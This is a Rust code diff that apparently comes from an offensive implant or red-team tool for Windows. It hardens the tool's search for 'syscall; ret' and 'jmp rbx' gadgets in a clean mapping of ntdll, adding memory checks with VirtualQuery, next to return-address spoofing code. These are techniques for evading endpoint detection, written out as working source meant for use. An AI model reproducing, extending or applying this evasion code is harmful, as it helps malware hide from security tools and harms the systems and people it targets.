@@ -340,10 +340,18 @@ fn map_clean_ntdll() -> Result<usize> {
                 let start = loaded_ntdll_base + section.VirtualAddress as usize;
                 let size = *section.Misc.VirtualSize() as usize;
                 let code = std::slice::from_raw_parts(start as *const u8, size);
-                for j in 0..size.saturating_sub(1) {
+                for j in 0..size.saturating_sub(3) {  // Need at least 3 bytes: syscall + ret
                     if code[j] == 0x0f && code[j + 1] == 0x05 {
-                        gadget_addr = start + j;
-                        break;
+                        // M-30: Verify the syscall instruction doesn't cross a page boundary.
+                        // Also verify that the byte after 0x0F 0x05 is 0xC3 (ret) to ensure
+                        // we have a proper "syscall; ret" gadget, not just "syscall" followed
+                        // by arbitrary code.
+                        let candidate = start + j;
+                        let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
+                        if gadget_is_valid(candidate, gadget_len) {
+                            gadget_addr = candidate;
+                            break;
+                        }
                     }
                 }
                 break;
@@ -2104,6 +2112,65 @@ pub unsafe extern "C" fn get_spoof_ret() -> usize {
     REAL_RET_ADDR.with(|r| r.get())
 }
 
+/// Verify that a gadget at `addr` of `len` bytes is safe to execute:
+///   1. The entire gadget falls within a single committed memory region.
+///   2. The region is executable.
+///   3. The gadget does not straddle a 4KB page boundary.
+///
+/// Returns `true` if the gadget is safe, `false` otherwise.
+#[cfg(windows)]
+unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
+    use winapi::um::memoryapi::VirtualQuery;
+    use winapi::um::winnt::{MEMORY_BASIC_INFORMATION, MEM_COMMIT};
+
+    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+    let result = VirtualQuery(
+        addr as *const _,
+        &mut mbi,
+        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+    );
+    if result == 0 {
+        return false; // VirtualQuery failed — cannot verify
+    }
+
+    // Region must be committed
+    if mbi.State != MEM_COMMIT {
+        return false;
+    }
+
+    // Region must be executable (PAGE_EXECUTE_*, including execute-read variants)
+    const PAGE_EXECUTE: u32 = 0x10;
+    const PAGE_EXECUTE_READ: u32 = 0x20;
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
+    let prot = mbi.Protect;
+    let is_exec = prot == PAGE_EXECUTE
+        || prot == PAGE_EXECUTE_READ
+        || prot == PAGE_EXECUTE_READWRITE
+        || prot == PAGE_EXECUTE_WRITECOPY;
+    if !is_exec {
+        return false;
+    }
+
+    // The entire gadget must fit within this memory region
+    let region_end = mbi.BaseAddress as usize + mbi.RegionSize;
+    if addr + len > region_end {
+        return false;
+    }
+
+    // The gadget must not straddle a 4KB page boundary.
+    // This is a stronger check: even if both pages are in the same region,
+    // a gadget crossing a page boundary can cause issues if the second page
+    // has different TLB entries or is guarded.
+    let page_start = addr & !0xFFF;
+    let page_end = page_start + 0x1000;
+    if addr + len > page_end {
+        return false;
+    }
+
+    true
+}
+
 #[cfg(windows)]
 pub fn find_jmp_rbx_gadget() -> usize {
     let base = unsafe {
@@ -2120,8 +2187,13 @@ pub fn find_jmp_rbx_gadget() -> usize {
     let code = unsafe { std::slice::from_raw_parts(base as *const u8, size) };
     for i in 0..size.saturating_sub(1) {
         if code[i] == 0xff && code[i + 1] == 0xe3 {
-            // jmp rbx
-            return base + i;
+            let candidate = base + i;
+            // M-30: Verify the 2-byte gadget doesn't straddle a page boundary
+            // and the memory is committed + executable.
+            if unsafe { gadget_is_valid(candidate, 2) } {
+                return candidate;
+            }
+            // If validation fails, continue searching for another match.
         }
     }
     0
